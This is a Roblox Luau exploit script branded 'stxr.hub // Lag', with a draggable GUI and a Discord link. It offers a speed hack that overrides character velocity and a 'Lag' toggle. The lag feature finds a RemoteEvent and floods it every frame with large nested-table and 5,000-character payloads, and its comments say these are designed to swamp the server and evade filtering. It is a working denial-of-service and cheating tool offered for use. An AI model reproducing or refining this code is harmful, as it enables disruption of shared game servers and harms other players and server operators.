local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Stats = game:GetService("Stats")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer

-- LOGIC VARIABLES
local isLagging = false
local speedActive = false
local packetMultiplier = 4 
local walkSpeedVal = 56 
local jumpPowerVal = 75 

-- NEW METHOD PAYLOADS (Harder for servers to filter)
local function getComplexPayload()
    local t = {}
    for i = 1, 100 do
        t[i] = {math.random(1,1e6), string.rep("ðŸ’€", 10)} -- Mixed types are harder to process
    end
    return t
end

local uuid = "d80e2217-36b8-4bdc-9a46-2281c6f70b28"
local payloadString = string.rep("z", 5000)

-- Find Remote
local target
for _, v in pairs(game:GetDescendants()) do
    if v:IsA("RemoteEvent") and v.Name ~= "friendmain" and v.Name ~= "ping" then
        target = v
        break
    end
end

-- UI SETUP (EXACT V2.2 - NO CHANGES)
local gui = Instance.new("ScreenGui")
gui.Name = "stxr_hub_v2_2"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 240, 0, 300)
main.Position = UDim2.new(0.5, -120, 0.4, -150)
main.BackgroundColor3 = Color3.fromRGB(12, 8, 18)
main.BackgroundTransparency = 0.3
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true
main.Parent = gui

local miniBtn = Instance.new("TextButton")
miniBtn.Size = UDim2.new(0, 50, 0, 50)
miniBtn.Position = UDim2.new(0.5, -25, 0.1, 0)
miniBtn.BackgroundColor3 = Color3.fromRGB(12, 8, 18)
miniBtn.BackgroundTransparency = 0.3
miniBtn.BorderSizePixel = 0
miniBtn.Text = "â­"
miniBtn.TextColor3 = Color3.new(1, 1, 1)
miniBtn.TextSize = 25
miniBtn.Visible = false
miniBtn.Active = true
miniBtn.Draggable = true
miniBtn.Parent = gui
Instance.new("UICorner", miniBtn).CornerRadius = UDim.new(0, 12)

local function applyStxrStroke(parent)
    local stroke = Instance.new("UIStroke")
    stroke.Thickness = 2.5
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Color = Color3.new(1, 1, 1)
    stroke.Parent = parent

    local grad = Instance.new("UIGradient")
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(160, 0, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(20, 10, 40)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(160, 0, 255))
    })
    grad.Parent = stroke
    
    task.spawn(function()
        while task.wait(0.01) do grad.Rotation += 3 end
    end)
end

applyStxrStroke(main)
applyStxrStroke(miniBtn)
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 9)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 45)
title.Text = "stxr.hub // Lag"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 14
title.BackgroundTransparency = 1
title.Parent = main

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -35, 0, 7)
closeBtn.BackgroundTransparency = 1
closeBtn.Text = "â€“"
closeBtn.TextColor3 = Color3.new(1, 1, 1)
closeBtn.TextSize = 20
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = main

closeBtn.MouseButton1Click:Connect(function()
    main.Visible = false
    miniBtn.Visible = true
end)

miniBtn.MouseButton1Click:Connect(function()
    miniBtn.Visible = false
    main.Visible = true
end)

local pingLabel = Instance.new("TextLabel")
pingLabel.Size = UDim2.new(0, 60, 0, 20)
pingLabel.Position = UDim2.new(1, -70, 0, 40)
pingLabel.Text = "Ping: 0ms"
pingLabel.TextColor3 = Color3.fromRGB(0, 255, 120)
pingLabel.Font = Enum.Font.GothamBold
pingLabel.TextSize = 9
pingLabel.BackgroundTransparency = 1
pingLabel.Parent = main

task.spawn(function()
    while task.wait(0.5) do
        pingLabel.Text = "Ping: " .. math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) .. "ms"
    end
end)

local function createModule(name, key, yPos, callback, min, max, default, sliderCallback)
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0.4, 0, 0, 20)
    label.Position = UDim2.new(0.08, 0, 0, yPos)
    label.Text = name
    label.TextColor3 = Color3.fromRGB(220, 220, 220)
    label.Font = Enum.Font.Gotham
    label.TextSize = 13
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.BackgroundTransparency = 1
    label.Parent = main

    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(0.4, 0, 0, 20)
    status.Position = UDim2.new(0.52, 0, 0, yPos)
    status.Text = "OFF"
    status.TextColor3 = Color3.fromRGB(255, 50, 50)
    status.Font = Enum.Font.GothamBold
    status.TextSize = 10
    status.TextXAlignment = Enum.TextXAlignment.Right
    status.BackgroundTransparency = 1
    status.Parent = main

    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.84, 0, 0, 32)
    btn.Position = UDim2.new(0.08, 0, 0, yPos + 22)
    btn.BackgroundColor3 = Color3.fromRGB(25, 20, 35)
    btn.BackgroundTransparency = 0.2
    btn.Text = name .. " (" .. key .. ")"
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.GothamSemibold
    btn.TextSize = 12
    btn.Parent = main
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        local state = callback()
        status.Text = state and "ON" or "OFF"
        status.TextColor3 = state and Color3.fromRGB(0, 255, 120) or Color3.fromRGB(255, 50, 50)
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = state and Color3.fromRGB(140, 0, 255) or Color3.fromRGB(25, 20, 35)}):Play()
    end)

    local sLabel = Instance.new("TextLabel")
    sLabel.Size = UDim2.new(0.84, 0, 0, 20)
    sLabel.Position = UDim2.new(0.08, 0, 0, yPos + 58)
    sLabel.Text = default .. " " .. name:lower()
    sLabel.TextColor3 = Color3.new(1, 1, 1)
    sLabel.Font = Enum.Font.Gotham
    sLabel.TextSize = 11
    sLabel.BackgroundTransparency = 1
    sLabel.Parent = main

    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(0.84, 0, 0, 3)
    bar.Position = UDim2.new(0.08, 0, 0, yPos + 80)
    bar.BackgroundColor3 = Color3.fromRGB(50, 40, 70)
    bar.BorderSizePixel = 0
    bar.Parent = main

    local knob = Instance.new("TextButton")
    knob.Size = UDim2.new(0, 10, 0, 10)
    knob.AnchorPoint = Vector2.new(0.5, 0.5)
    knob.Position = UDim2.new((default-min)/(max-min), 0, 0.5, 0)
    knob.BackgroundColor3 = Color3.new(1, 1, 1)
    knob.Text = ""
    knob.Parent = bar
    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

    local dragging = false
    local function update(input)
        local inputX = (input.UserInputType == Enum.UserInputType.Touch and input.Position.X) or input.Position.X
        local pos = math.clamp((inputX - bar.AbsolutePosition.X) / bar.AbsoluteSize.X, 0, 1)
        knob.Position = UDim2.new(pos, 0, 0.5, 0)
        local val = math.floor(min + (pos * (max - min)))
        sLabel.Text = val .. " " .. name:lower()
        sliderCallback(val)
    end

    knob.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then dragging = true end end)
    UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then dragging = false end end)
    UserInputService.InputChanged:Connect(function(i) if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then update(i) end end)
    
    return btn
end

local lagBtn = createModule("Lag", "X", 65, function() isLagging = not isLagging return isLagging end, 1, 50, 4, function(v) packetMultiplier = v end)
local speedBtn = createModule("Speed", "F", 170, function() speedActive = not speedActive return speedActive end, 1, 300, 56, function(v) walkSpeedVal = v end)

local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, 0, 0, 30)
footer.Position = UDim2.new(0, 0, 1, -25)
footer.Text = "discord.gg/stxrhub"
footer.TextColor3 = Color3.fromRGB(150, 120, 200)
footer.Font = Enum.Font.Gotham
footer.TextSize = 10
footer.BackgroundTransparency = 1
footer.Parent = main

--- CORE ENGINE (NEW LOGIC) ---
RunService.Heartbeat:Connect(function()
    local char = player.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")

    if hum and root and speedActive and hum.MoveDirection.Magnitude > 0 then
        root.Velocity = Vector3.new(hum.MoveDirection.X * walkSpeedVal, root.Velocity.Y, hum.MoveDirection.Z * walkSpeedVal)
    end

    if isLagging and target then
        -- This logic is split so the client doesn't freeze but the server gets swamped
        task.spawn(function()
            for i = 1, packetMultiplier do
                target:FireServer(getComplexPayload()) -- Forces server to unpack deep tables
                target:FireServer(uuid, payloadString) -- Standard heavy packet
            end
        end)
    end
end)

UserInputService.InputBegan:Connect(function(i, g)
    if g then return end
    if i.KeyCode == Enum.KeyCode.Insert then 
        if miniBtn.Visible then miniBtn.Visible = false main.Visible = true else main.Visible = not main.Visible end 
    end
end)
